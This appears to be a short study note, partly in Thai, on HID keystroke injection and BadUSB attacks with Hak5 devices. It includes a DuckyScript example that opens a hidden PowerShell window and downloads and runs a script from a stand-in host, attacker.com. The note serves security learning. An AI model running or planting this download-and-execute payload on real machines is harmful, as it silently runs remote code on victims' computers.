# ⚡ Hardware Keystroke Injection & BadUSB Attacks

> **Phase:** [phase-b-scripting](../) | **Tags:** `#hardware` `#badusb` `#rubberducky` `#hak5`  

---

## 📑 Core Modules Overview
- [ ] [[#4.4 Hardware Attacks — Hak5 Hardware & BadUSB|4.4 Hak5 Hardware Arsenal (Rubber Ducky, Key Croc, LAN Turtle)]]

---

## 4.4 Hardware Attacks — Hak5 Hardware & BadUSB
- **Status:** ⏳ รอคิว
- **Core Concept:** กลไกการโจมตีแบบ Human Interface Device (HID): คอมพิวเตอร์ไว้ใจคีย์บอร์ด 100% ทำให้ BadUSB สามารถส่งคีย์ลัดเปิด Terminal และดาวน์โหลด Payload ได้ในเวลาเพียง 2 วินาที

### 💻 Basic DuckyScript Syntax
```text
REM เปิด PowerShell และดาวน์โหลด Payload
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
ENTER
```
